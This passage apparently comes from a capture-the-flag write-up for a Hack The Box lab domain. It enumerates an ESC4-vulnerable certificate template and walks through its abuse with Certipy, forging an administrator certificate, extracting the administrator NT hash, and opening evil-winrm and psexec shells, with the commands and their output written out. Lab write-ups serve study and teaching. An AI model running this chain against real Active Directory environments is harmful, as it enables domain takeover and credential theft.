[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions

```
	- Vulnerable permission : ESC4
- https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/
	- Shows how to exploit ESC4 involving misconfigurations on the certificate template. These security issues arise when a non-administrator account can modify a certificate template and as a result gain access to privileged resources such as domain controller.
- Certipy template arguments
	```bash
certipy template --help
```
- Modify the certificate:
	```bash
certipy template -dc-ip 10.10.11.51 -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -template DunderMifflinAuthentication -target sequel.htb -save-old

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```
- Request domain admin certificate using the modified template:
	```bash
certipy req -ca sequel-DC01-CA -dc-ip 10.10.11.51 -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -template DunderMifflinAuthentication -target sequel.htb -upn administrator@sequel.htb

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 18
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```
	- Note that this fails a few times for some reason...(a failed to find domain name error)
		- I used -dns and -ns arguments but that didn't change much but when I redo the certipy template command and pass this quickly it ended up working.
			- Either time-gated or some other issue and the template command was irrelevant
- request the domain admin TGT Ticket or the administrator hash to gain access to the domain controller.
	```bash
certipy auth -pfx administrator.pfx -domain 'sequel.htb'   
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```
- We can now login as admin:
	```bash
evil-winrm -i 10.10.11.51 -u 'Administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'

--OR--

impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff administrator@10.10.11.51

---OUTPUT-WINRM---
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator

---OUTPUT-PSEXEC---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.51.....
[-] share 'Accounting Department' is not writable.
[*] Found writable share ADMIN$
[*] Uploading file UXkeOgNR.exe
[*] Opening SVCManager on 10.10.11.51.....
[*] Creating service IerY on 10.10.11.51.....
[*] Starting service IerY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6640]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
	- We can now grab root.txt
-------
--------